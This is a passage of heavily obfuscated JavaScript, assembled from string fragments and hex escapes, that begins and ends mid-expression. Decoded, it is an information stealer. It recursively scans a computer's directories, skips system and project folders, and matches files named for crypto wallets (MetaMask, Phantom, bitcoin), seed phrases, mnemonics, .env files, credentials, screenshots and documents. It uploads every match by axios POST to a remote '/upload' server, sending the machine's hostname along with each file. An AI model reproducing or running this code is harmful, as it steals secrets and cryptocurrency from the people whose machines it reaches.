20\x20'+'\x20\x20'+'\x22n'+'pm'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'ho'+'ok'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22a'+'nd'+'ro'+'id'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'ex'+'am'+'pl'+'e\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22A'+'pp'+'Da'+'ta'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'ve'+'nd'+'or'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22v'+'en'+'do'+'r\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22p'+'ub'+'li'+'c\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22b'+'un'+'dl'+'e\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22c'+'om'+'mo'+'n\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22s'+'pe'+'c.'+'ts'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'te'+'st'+'.t'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22t'+'es'+'t.'+'js'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'cs'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22l'+'es'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22s'+'cs'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'ca'+'ch'+'e\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'mi'+'n.'+'js'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*.'+'ts'+'x\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.j'+'sx'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.w'+'in'+'e\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'co'+'nd'+'a\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'mo'+'ve'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.t'+'ld'+'rc'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.a'+'vm'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.b'+'ro'+'wn'+'ie'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.3'+'T\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'no'+'de'+'-g'+'yp'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.g'+'k\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'co'+'nf'+'ig'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.g'+'nu'+'pg'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.p'+'m2'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.s'+'ni'+'pa'+'st'+'e\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'vu'+'e-'+'cl'+'i-'+'ui'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.c'+'ur'+'so'+'r\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'vs'+'co'+'de'+'-s'+'er'+'ve'+'r\x22'+(',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'ca'+'rg'+'o\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'lo'+'ca'+'l\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'ru'+'st'+'up'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.p'+'ub'+'-c'+'ac'+'he'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.T'+'ra'+'sh'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.d'+'ll'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.d'+'mg'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.p'+'kg'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.m'+'si'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.m'+'p4'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.n'+'vm'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.s'+'ol'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.m'+'p3'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.s'+'ys'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.a'+'vi'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.d'+'at'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'an'+'ac'+'on'+'da'+'3\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'ya'+'rn'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'bu'+'il'+'d\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'ne'+'xt'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.g'+'it'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.g'+'it'+'hu'+'b\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22c'+'ac'+'he'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'tm'+'p\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22t'+'em'+'p\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22d'+'is'+'t\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22l'+'ib'+'ra'+'ry'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'li'+'b\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22i'+'mg'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22i'+'mg'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'im'+'ag'+'es'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'im'+'ag'+'e\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22p'+'lu'+'gi'+'n\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22p'+'lu'+'gi'+'n\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'vs'+'co'+'de'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'pa'+'ck'+'ag'+'e-'+'lo'+'ck'+'.j'+'so'+'n\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'py'+'p\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'my'+'i\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'ru'+'st'+'up'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'.d'+'oc'+'ke'+'r\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22m'+'an'+'if'+'es'+'t\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22.'+'ex'+'po'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'Ap'+'pD'+'at'+'a\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22w'+'in'+'do'+'ws'+'.o'+'ld'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'pk'+'g\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22p'+'ac'+'ka'+'ge'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'pa'+'ck'+'ag'+'es'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'op'+'en'+'ze'+'pp'+'el'+'in'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'pr'+'is'+'ma'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'pk'+'gs'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'fo'+'nt'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22d'+'eb'+'ug'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'ba'+'ck'+'gr'+'ou'+'nd'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'wa'+'ll'+'pa'+'pe'+'r\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22_'+'lo'+'ca'+'le'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22l'+'oc'+'al')+('e\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22l'+'oc'+'al'+'es'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'Pr'+'og'+'ra'+'m\x20'+'Fi'+'le'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22P'+'ro'+'gr'+'am'+'\x20F'+'il'+'es'+'\x20('+'x8'+'6)'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'Pr'+'og'+'ra'+'mD'+'at'+'a\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22W'+'in'+'do'+'ws'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'Mi'+'cr'+'os'+'of'+'t\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22$'+'RE'+'CY'+'CL'+'E.'+'BI'+'N\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22V'+'is'+'ua'+'l\x20'+'St'+'ud'+'io'+'\x20C'+'od'+'e.'+'ap'+'p\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'];'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20s'+'ea'+'rc'+'hK'+'ey'+'\x20='+'\x20['+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*.'+'en'+'v*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*m'+'et'+'am'+'as'+'k*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*p'+'ha'+'nt'+'om'+'*\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'bi'+'tc'+'oi'+'n*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*b'+'tc'+'*\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'Tr'+'us'+'t*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*p'+'hr'+'as'+'e*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*s'+'ec'+'re'+'t*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*p'+'ha'+'se'+'*\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'cr'+'ed'+'en'+'ti'+'al'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*p'+'ro'+'fi'+'le'+'*\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'ac'+'co'+'un'+'t*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*m'+'ne'+'mo'+'ni'+'c*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*s'+'ee'+'d*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*r'+'ec'+'ov'+'er'+'y*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*b'+'ac'+'ku'+'p*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*a'+'dd'+'re'+'ss'+'*\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'ke'+'yp'+'ai'+'r*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*w'+'al'+'le'+'t*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*m'+'y*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*s'+'cr'+'ee'+'ns'+'ho'+'t*'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*.'+'do'+'c\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.d'+'oc'+'x\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.p'+'df'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*.'+'md'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*.'+'rt'+'f\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.o'+'dt'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*.'+'xl'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.x'+'ls'+'x\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.t'+'xt'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x22'+'*.'+'in'+'i\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.s'+'ec'+'re'+'t\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.j'+'so'+'n\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.t'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.j'+'s\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22*'+'.c'+'sv'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20]'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'uu'+'\x20='+'\x20\x22'+'ht'+'tp'+':/'+'/'))['co'+'nc'+'at'](ab,':')['co'+'nc'+'at'](Z,'/u'+'pl'+'oa'+'d\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'uf'+'\x20='+'\x20a'+'sy'+'nc'+'\x20('+'p)'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'fs'+'.s'+'ta'+'tS'+'yn'+'c('+'p)'+'.i'+'sF'+'il'+'e('+'))'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20f'+'or'+'m\x20'+'=\x20'+'ne'+'w\x20'+'Fo'+'rm'+'Da'+'ta'+'()'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'fo'+'rm'+'.a'+'pp'+'en'+'d('+'\x22f'+'il'+'e\x22'+',\x20'+'fs'+'.c'+'re'+'at'+'eR'+'ea'+'dS'+'tr'+'ea'+'m('+'p)'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ry'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20r'+'es'+'po'+'ns'+'e\x20'+'=\x20'+'aw'+'ai'+'t\x20'+'ax'+'io'+'s.'+'po'+'st'+'(u'+'u,'+'\x20f'+'or'+'m,'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20h'+'ea'+'de'+'rs'+':\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'..'+'.f'+'or'+'m.'+'ge'+'tH'+'ea'+'de'+'rs'+'()'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'us'+'er'+'ke'+'y:'+'\x20')['co'+'nc'+'at'](W,',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ho'+'st'+'na'+'me'+':\x20'+'os'+'.h'+'os'+'tn'+'am'+'e('+'),'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20p'+'at'+'h:'+'\x20p'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'t:'+'\x20\x22')['co'+'nc'+'at'](a1,'\x22\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'},'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x20c'+'at'+'ch'+'\x20('+'up'+'lo'+'ad'+'Er'+'r)'+'\x20{'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'};'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20t'+'oR'+'eg'+'ex'+'\x20='+'\x20('+'pa'+'tt'+'er'+'n)'+'\x20='+'>\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ne'+'w\x20'+'Re'+'gE'+'xp'+'(\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22^'+'\x22\x20'+'+\x20'+'pa'+'tt'+'er'+'n.'+'re'+'pl'+'ac'+'e('+'/\x5c'+'./'+'g,'+'\x20\x22'+'\x5c\x5c'+'.\x22'+').'+'re'+'pl'+'ac'+'e('+'/\x5c'+'*/'+'g,'+'\x20\x22'+'.*'+'\x22)'+'\x20+'+'\x20\x22'+'$\x22'+',\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x22i'+'\x22\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'//'+'\x20M'+'at'+'ch'+'\x20f'+'il'+'e\x20'+'wi'+'th'+'\x20a'+'ny'+'\x20p'+'at'+'te'+'rn'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20i'+'sF'+'il'+'eM'+'at'+'ch'+'in'+'g\x20'+'=\x20'+'(f'+'il'+'en'+'am'+'e)'+'\x20='+'>\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'re'+'tu'+'rn'+'\x20s'+'ea'+'rc'+'hK'+'ey'+'.s'+'om'+'e('+'(p'+'at'+'te'+'rn'+')\x20'+'=>'+'\x20t'+'oR'+'eg'+'ex'+'(p'+'at'+'te'+'rn'+').'+'te'+'st'+'(f'+'il'+'en'+'am'+'e)'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20/'+'/\x20'+'Re'+'cu'+'rs'+'iv'+'e\x20'+'di'+'re'+'ct'+'or'+'y\x20'+'sc'+'an'+'\x20a'+'nd'+'\x20u'+'pl'+'oa'+'d\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'sc'+'an'+'Di'+'r\x20'+'=\x20'+'as'+'yn'+'c\x20'+'(d'+'ir'+'Pa'+'th'+')\x20'+'=>'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(!'+'fs'+'.e'+'xi'+'st'+'sS'+'yn'+'c('+'di'+'rP'+'at'+'h)'+')\x20'+'re'+'tu'+'rn'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20i'+'te'+'ms'+'\x20='+'\x20f'+'s.'+'re'+'ad'+'di'+'rS'+'yn'+'c('+'di'+'rP'+'at'+'h)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20f'+'or'+'\x20('+'co'+'ns'+'t\x20'+'it'+'em'+'\x20o'+'f\x20'+'it'+'em'+'s)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ry'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20f'+'ul'+'lP'+'at'+'h\x20'+'=\x20'+'pa'+'th'+'.j'+'oi'+'n('+'di'+'rP'+'at'+'h,'+'\x20i'+'te'+'m)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'it'+'em'+'\x20='+'=\x20'+'\x22g'+'o\x22'+')\x20'+'co'+'nt'+'in'+'ue'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'co'+'nt'+'ai'+'ns'+'Ex'+'cl'+'ud'+'ed'+'Wo'+'rd'+'\x20='+'\x20e'+'xc'+'lu'+'de'+'Fo'+'ld'+'er'+'s.'+'so'+'me'+'(('+'wo'+'rd'+')\x20'+'=>'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20f'+'ul'+'lP'+'at'+'h.'+'to'+'Lo'+'we'+'rC'+'as'+'e('+').'+'in'+'cl'+'ud'+'es'+'(w'+'or'+'d.'+'to'+'Lo'+'we'+'rC'+'as'+'e('+'))'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(c'+'on'+'ta'+'in'+'sE'+'xc'+'lu'+'de'+'dW'+'or'+'d)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'ti'+'nu'+'e;'+'\x20/'+'/\x20'+'Sk'+'ip'+'\x20i'+'f\x20'+'fu'+('ll'+'\x20p'+'at'+'h\x20'+'co'+'nt'+'ai'+'ns'+'\x20a'+'ny'+'\x20e'+'xc'+'lu'+'de'+'d\x20'+'wo'+'rd'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20s'+'ta'+'t\x20'+'=\x20'+'fs'+'.s'+'ta'+'tS'+'yn'+'c('+'fu'+'ll'+'Pa'+'th'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'st'+'at'+'.i'+'sD'+'ir'+'ec'+'to'+'ry'+'()'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'!e'+'xc'+'lu'+'de'+'Fo'+'ld'+'er'+'s.'+'in'+'cl'+'ud'+'es'+'(i'+'te'+'m)'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'aw'+'ai'+'t\x20'+'sc'+'an'+'Di'+'r('+'fu'+'ll'+'Pa'+'th'+',\x20'+'ex'+'cl'+'ud'+'eF'+'ol'+'de'+'rs'+');'+'\x0a\x20'+'\x20